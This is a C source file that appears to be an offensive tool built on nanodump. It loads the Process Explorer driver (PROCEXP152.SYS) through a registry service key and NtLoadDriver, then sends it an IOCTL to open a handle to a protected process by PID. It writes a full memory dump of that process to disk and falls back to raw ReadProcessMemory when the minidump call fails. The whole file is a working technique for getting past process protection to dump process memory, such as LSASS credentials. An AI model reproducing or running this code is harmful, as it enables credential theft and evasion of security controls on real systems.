#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include "nanodump.h"

#define CONTROL_CODE_OPEN_PROTECTED_PROCESS  0x8335003c

typedef NTSTATUS(*fNtLoadDriver)(PUNICODE_STRING);

BOOL CurrentProcessAdjustToken(const wchar_t * name)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES sTP;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        if (!LookupPrivilegeValue(NULL, name, &sTP.Privileges[0].Luid))
        {
            CloseHandle(hToken);
            return FALSE;
        }
        sTP.PrivilegeCount = 1;
        sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
        {
            CloseHandle(hToken);
            return FALSE;
        }
        CloseHandle(hToken);
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char ** argv) {
    dump_context dc = { 0 };
    HKEY hServiceKey;
    LONG lResult;
    DWORD disp;
    DWORD val = 0;
    UNICODE_STRING regpath;
    const char* szServiceName = "ProcExp"; // Replace with your service name
    const char ImagePath[] = "\\SystemRoot\\System32\\Drivers\\PROCEXP152.SYS"; // Service description
    wchar_t registryPath[] = L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\procexp";
    regpath.Buffer = registryPath;
    regpath.Length = wcslen(regpath.Buffer) * 2;
    regpath.MaximumLength = sizeof(registryPath) * 2 + 2;
    if (argc == 1)
    {
        printf("%s pid writepath", argv[0]);
        return 1;
    }


    fNtLoadDriver fpNtLoadDriver = (fNtLoadDriver)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
    if (fpNtLoadDriver == NULL)
    {
        printf("could not get required func\n");
        return 0;
    }
    if (!CurrentProcessAdjustToken(SE_LOAD_DRIVER_NAME) || !CurrentProcessAdjustToken(SE_DEBUG_NAME))
    {
        printf("Could not enable required privs\n");
        return 0;
    }
    // Open a handle to the desired registry key
    lResult = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE, // Root key
        "SYSTEM\\CurrentControlSet\\Services\\procexp", // Subkey path
        0, // Reserved
        NULL, // Class type of this key
        REG_OPTION_VOLATILE, // Keep the key after system restart
        KEY_WRITE, // Desired access
        NULL, // Security attributes
        &hServiceKey, // Handle to the opened key
        &disp  // Disposition value
    );

    if (lResult != ERROR_SUCCESS) {
        printf("Error creating registry key: %ld\n", lResult);
        return 1;
    }
    if (disp == REG_CREATED_NEW_KEY)
    {
        // Set the description of the service
        lResult = RegSetValueExA(
            hServiceKey,
            "ImagePath",
            0, // Reserved
            REG_EXPAND_SZ, // Value type (string)
            (const BYTE*)ImagePath, // Pointer to the data
            sizeof(ImagePath) // Data size
        );

        if (lResult != ERROR_SUCCESS) {
            printf("Error setting registry value: %ld\n", lResult);
            RegCloseKey(hServiceKey);
            return 1;
        }
        val = 3;
        lResult = RegSetValueExA(
            hServiceKey,
            "Start",
            0, // Reserved
            REG_DWORD, // Value type (string)
            (const BYTE*)&val, // Pointer to the data
            4 // Data size
        );

        if (lResult != ERROR_SUCCESS) {
            printf("Error setting registry value: %ld\n", lResult);
            RegCloseKey(hServiceKey);
            return 1;
        }
        val = 1;
        lResult = RegSetValueExA(
            hServiceKey,
            "ErrorControl",
            0, // Reserved
            REG_DWORD, // Value type (string)
            (const BYTE*)&val, // Pointer to the data
            4 // Data size
        );

        if (lResult != ERROR_SUCCESS) {
            printf("Error setting registry value: %ld\n", lResult);
            RegCloseKey(hServiceKey);
            return 1;
        }

        lResult = RegSetValueExA(
            hServiceKey,
            "Type",
            0, // Reserved
            REG_DWORD, // Value type (string)
            (const BYTE*)&val, // Pointer to the data
            4 // Data size
        );

        if (lResult != ERROR_SUCCESS) {
            printf("Error setting registry value: %ld\n", lResult);
            RegCloseKey(hServiceKey);
            return 1;
        }

        // Close the registry key handle
        RegCloseKey(hServiceKey);

        printf("Service registry key created successfully.\n");
    }
    else
    {
        printf("Registry Keys already existed\n");
    }
    NTSTATUS status = fpNtLoadDriver(&regpath);
    printf("status = 0x%x\n", status);
    if (status != 0 && status != 0xc000010e)
    {
        return 1;
    }
    HANDLE hdriver = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hdriver == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open handle to driver %d\n", GetLastError());
        return 1;
    }
    HANDLE hproc = NULL;
    DWORD returned = 0;
    UINT64 pid = atol(argv[1]);
    BOOL bret = DeviceIoControl(hdriver, CONTROL_CODE_OPEN_PROTECTED_PROCESS, &pid, sizeof(pid), &hproc, sizeof(HANDLE), &returned, NULL);
    printf("return was %d handle is %x, last error is %d", bret, hproc, GetLastError());
    unsigned char* addr = 0;
    printf("%d\n", GetLastError());
    if (hproc != NULL)
    {

        /*dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
        size_t region_size = DUMP_MAX_SIZE;
        PVOID base_address = allocate_memory(&region_size);
        dc.hProcess = hproc;
        dc.BaseAddress = base_address;
        dc.rva = 0;
        dc.DumpMaxSize = region_size;
        bret = NanoDumpWriteDump(&dc);*/
        HANDLE dst = CreateFileA(argv[2], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(dst, dc.BaseAddress, dc.rva, NULL, NULL);
        CloseHandle(dst);
        bret = MiniDumpWriteDump(hproc, (DWORD)pid, dst, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (!bret)
        {
 
            printf("minidump failed : %d\n", GetLastError());
            MEMORY_BASIC_INFORMATION mbi;
            unsigned char* chunk = NULL;
            size_t read = 0;

            while (VirtualQueryEx(hproc, addr, &mbi, sizeof(mbi))) {
                printf("Base address: %p, Region size: %lu, State: %lu\n", mbi.BaseAddress, mbi.RegionSize, mbi.State);
                chunk = (unsigned char *)VirtualAlloc(NULL, mbi.RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                if (mbi.RegionSize != 0)
                {
                    ReadProcessMemory(hproc, mbi.BaseAddress, chunk, mbi.RegionSize, &read);
                    WriteFile(dst, chunk, read, NULL, NULL);
                }
                addr += mbi.RegionSize;

                VirtualFree(chunk, 0, MEM_FREE);
            }
        }
        else
        {
            printf("Minidump worked!\n");

        }

    }
    CloseHandle(hdriver);
    return 0;
}
